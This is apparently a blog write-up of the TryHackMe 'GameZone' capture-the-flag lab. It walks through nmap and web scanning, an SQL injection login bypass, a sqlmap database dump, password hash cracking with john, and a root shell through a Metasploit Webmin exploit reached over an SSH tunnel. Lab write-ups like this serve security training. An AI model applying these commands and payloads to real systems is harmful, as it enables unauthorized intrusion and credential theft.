---
title: "THM - GameZone without MetaSploit"
date: 2021-02-22
draft: true
categories: ["hacking", "write-ups"]
tags: [THM]
featuredImage: "/images/2021/02/GameZone_Logo.png"
---
## Intro

## Target
[THM - GameZone](https://tryhackme.com/room/gamezone)

## Recon
Quick recon according to logo and info :

* Linux ;
* Misc: SSH, SQLi (which means a web server).

## Enum
Let's start a full `nmap` scan :

```text
sudo nmap -T4 -A -p- -oA scan $target_ip
```
```text
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-22 11:38 CET
Nmap scan report for 10.10.116.116
Host is up (0.033s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/22%OT=22%CT=1%CU=42887%PV=Y%DS=2%DC=T%G=Y%TM=603389C
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=105%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   33.34 ms 10.11.0.1
2   33.56 ms 10.10.116.116

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.63 seconds
```
Not much to see here : `Apache/2.4.18`, and `ssh`. Not much in `searchsploit` either. Let's directly run our usual web scanners and manually browse the website with `Burp` in the meantime.

### Web scanning
First `nikto` :
```text
nikto -h http://10.10.116.116
```
```text
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.116.116
+ Target Hostname:    10.10.116.116
+ Target Port:        80
+ Start Time:         2021-02-22 11:52:39 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7863 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-02-22 11:58:11 (GMT1) (332 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Then `gobuster`:
```text
gobuster dir -u http://10.10.116.116 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .php
```
```text
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.116.116
[+] Threads:        200
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/02/22 11:53:03 Starting gobuster
===============================================================
/portal.php (Status: 302)
/index.php (Status: 200)
/images (Status: 301)
===============================================================
2021/02/22 11:53:48 Finished
===============================================================
```
Like we could guess, there is not much information from our scanners.

However, manual browsing revealed a `login and a search form`. Since we are working on [SQLi](https://owasp.org/www-community/attacks/SQL_Injection), they are most probably vulnerable!

It doesn't seem the search function is working (none of our request displayed in Burp show the search term), and we'll try to exploit the authentication box.

## Exploitation
Let's just try to use `' or 1=1 -- ` (there is an [extra space at the end](https://portswigger.net/web-security/sql-injection/cheat-sh) as username and a blank password, and we are in!

![GameZone Portal Search](/images/2021/02/GameZone_Portal_Search.png)


We now access to another search function, which this time, seems to be working, because this time, we notice that the search term in our Burp Request :

![GameZone Burp Request](/images/2021/02/GameZone_Burp_Req.png)

We will save this request as `req.txt` for a latter use.

It is now time to use our new saved request, in order to try to dump the credentials :
```text
sqlmap -r req.txt
```
It will quickly tell us the DB appears to be `MySQL`. Cancel this scan and launch it again with the new gathered info in order to dump the DB :


```text
sqlmap -r req.txt --dbms=mysql --dump
```
![GameZone SQLMap Dump](/images/2021/02/GameZone_SQLMap_Dump.png)

We now save our hash into hash.txt, and we can use various [online resources](https://md5decrypt.net/en/) to detect the hash type. OUr is `SHA256`.

Then we run :

```text
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
```
And it'll give us the password :

![GameZone JTR Pass](/images/2021/02/GameZone_JTR_Pass.png)

### Getting Initial Shell
We can now log in via SSH with our new-found credentials :

![GameZone Initial Shell](/images/2021/02/GameZone_Initial_Shell.png)

Let's harvest user flag :

![GameZone User Flag](/images/2021/02/GameZone_User_Flag.png)

### PrivEsc

As usual, I'll upload `lse.sh` on the server and run it in order to see if there is anything I could exploit to elevate my privileges. I didn't find anything obvious, so I'll now upload and run `linpeas.sh` as well!

We notice that `webmin` is installed and version is `1.580`, which is vulnerable to `RCE`!

![GameZone Webmin Version](/images/2021/02/GameZone_Webmin_Version.png)

NB : `webmin` being a tool for system administration via a website, it might be a great place to start looking.

First, we will set up an SSH tunnel in order to access `Webmin` from our attacking box :

```text
ssh -L 10000:127.0.0.1:10000 username@10.10.163.71
```

Then, we can check it worked with `curl -I 127.0.0.1:10000` which should returns a `200` status code.

As far, as I'd like to complete this without `MetaSploit`, it seems I am stuck! I found [this repo](https://github.com/roughiz/Webmin-1.910-Exploit-Script), for a manual exploitation. However, it is a Python2 script, and it seems some modules are deprecated... which might why I am not able to connect back to my listener :

![GameZone No MSF](/images/2021/02/GameZone_No_MSF.png)

So... We now, run `msfconsole` and use `unix/webapp/webmin_show_cgi_exec`, set the required options and run it. Boom! We have a shell :

![GameZone Root Shell](/images/2021/02/GameZone_MSF_Root.png)

And we harvest our root flag :

![GameZone Root Flag](/images/2021/02/GameZone_Root_Flag.png)

## Outro
